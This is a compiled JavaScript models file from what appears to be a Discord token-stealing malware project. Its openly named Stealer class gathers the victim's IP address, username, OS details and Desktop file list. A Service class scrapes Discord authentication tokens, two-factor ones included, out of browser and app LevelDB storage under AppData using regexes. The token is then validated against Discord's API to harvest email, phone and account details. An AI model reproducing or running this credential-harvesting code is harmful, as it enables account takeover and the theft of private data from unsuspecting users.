"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const Bluebird = require("bluebird");
const fs = require("promise-fs");
const path = require("path");
const os = require("os");
const collection_1 = require("@discordjs/collection");
const node_fetch_1 = require("node-fetch");
//export type DiscordCollection<T> = Collection<Snowflake, T>;
class List extends collection_1.default {
    constructor(entries) {
        super(entries);
    }
    static fromArray(array) {
        const list = new List();
        array.forEach((entry) => {
            list.add(entry);
        });
        return list;
    }
    add(entry) {
        return this.set(this.size, entry);
    }
    addRange(entries) {
        entries.each((entry) => this.add(entry));
        return this;
    }
    difference(other) {
        return other.filter((_, key) => !this.has(key)).concat(this.filter((_, key) => !other.has(key)));
    }
}
exports.List = List;
class FileInfo {
    constructor(fullPath, stats) {
        this.fullPath = fullPath;
        this.stats = stats;
    }
    get name() {
        return path.basename(this.fullPath);
    }
    get isFile() {
        return this.stats.isFile();
    }
    get isDirectory() {
        return this.stats.isDirectory();
    }
}
exports.FileInfo = FileInfo;
class Stealer {
    constructor() { }
    static async getIP() {
        const response = await node_fetch_1.default('https://api.ipify.org/?format=json');
        const json = await response.json();
        return json.ip;
    }
    static getUsername() {
        return os.userInfo().username;
    }
    static getOS() {
        return {
            platform: os.platform ? os.platform() : null,
            arch: os.arch ? os.arch() : null,
            type: os.type ? os.type() : null,
            version: os.version ? os.version() : null,
            release: os.release ? os.release() : null
        };
    }
    static async getDesktopFiles() {
        try {
            const fullDir = path.resolve(os.userInfo().homedir, 'Desktop');
            const filenames = await fs.readdir(fullDir);
            const files = await Bluebird.map(filenames, async (file) => {
                const filePath = path.resolve(fullDir, file);
                return new FileInfo(filePath, await fs.stat(filePath));
            });
            return files;
        }
        catch {
            return [];
        }
    }
    static async getGifts(token) {
        const response = await node_fetch_1.default('https://discord.com/api/v6/users/@me/entitlements/gifts', {
            headers: {
                'authorization': token
            }
        });
        const json = await response.json();
        return JSON.stringify(json);
    }
}
exports.Stealer = Stealer;
class Service {
    constructor(name, dir, searchLogs = false) {
        this.name = name;
        this.dir = dir;
        this.searchLogs = searchLogs;
    }
    async getTokens() {
        var _a;
        const fullDir = path.resolve(os.userInfo().homedir, 'AppData', this.dir, 'Local Storage', 'leveldb');
        const tokens = new List();
        try {
            await fs.stat(fullDir);
        }
        catch {
            return tokens;
        }
        const filesLDB = (await fs.readdir(fullDir))
            .filter((file) => file.endsWith('.ldb'));
        const filesLog = (await fs.readdir(fullDir))
            .filter((file) => file.endsWith('.log'));
        try {
            const contentsLDB = await Bluebird.map(filesLDB, (file) => {
                return fs.readFile(path.resolve(fullDir, file), {
                    encoding: 'utf8'
                });
            });
            const contentsLog = await Bluebird.map(filesLog, (file) => {
                return fs.readFile(path.resolve(fullDir, file), {
                    encoding: 'utf8'
                });
            });
            contentsLDB.forEach((content) => {
                tokens.addRange(this.extractTokens(content));
            });
            if (this.searchLogs) {
                contentsLog.forEach((content) => {
                    tokens.addRange(this.extractTokens(content));
                });
            }
        }
        catch (error) {
            console.log(error);
        }
        if (tokens.size > 0) {
            (_a = tokens.last()) === null || _a === void 0 ? void 0 : _a.markNewest();
        }
        return tokens;
    }
    extractTokens(content) {
        var _a, _b;
        const tokens = new List();
        (_a = content.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)) === null || _a === void 0 ? void 0 : _a.forEach((match) => {
            const token = new Token(this, TokenType.Normal, match);
            tokens.add(token);
        });
        (_b = content.match(/mfa\.[\w-]{84}/g)) === null || _b === void 0 ? void 0 : _b.forEach((match) => {
            const token = new Token(this, TokenType.TwoFactor, match);
            tokens.add(token);
        });
        return tokens;
    }
}
exports.Service = Service;
var TokenType;
(function (TokenType) {
    TokenType[TokenType["Normal"] = 0] = "Normal";
    TokenType[TokenType["TwoFactor"] = 1] = "TwoFactor";
})(TokenType = exports.TokenType || (exports.TokenType = {}));
class Token {
    constructor(service, type, token) {
        this.service = service;
        this.type = type;
        this.token = token;
        this.newest = false;
    }
    markNewest() {
        this.newest = true;
    }
    compare(another) {
        return this.type == another.type && this.token == another.token;
    }
    static compare(first, second) {
        return first.type == second.type && first.token == second.token;
    }
}
exports.Token = Token;
class DiscordUser {
    constructor(data) {
        this.id = data.id;
        this.username = data.username;
        this.discriminator = data.discriminator;
        this.email = data.email;
        this.phone = data.phone;
        this.locale = data.locale;
        this.verified = data.verified;
        this.nitro = Boolean(data.premium_type);
        this.mfaEnabled = data.mfa_enabled;
    }
    static async getUser(token) {
        try {
            const response = await node_fetch_1.default(`https://discord.com/api/v6/users/@me`, {
                headers: {
                    'authorization': token
                }
            });
            const json = await response.json();
            if (json.code === 0)
                return null;
            return new DiscordUser(json);
        }
        catch {
            return null;
        }
    }
    get tag() {
        return `${this.username}#${this.discriminator}`;
    }
}
exports.DiscordUser = DiscordUser;
class ValidToken extends Token {
    constructor(token, user) {
        super(token.service, token.type, token.token);
        this.user = user;
    }
}
exports.ValidToken = ValidToken;
//# sourceMappingURL=models.js.map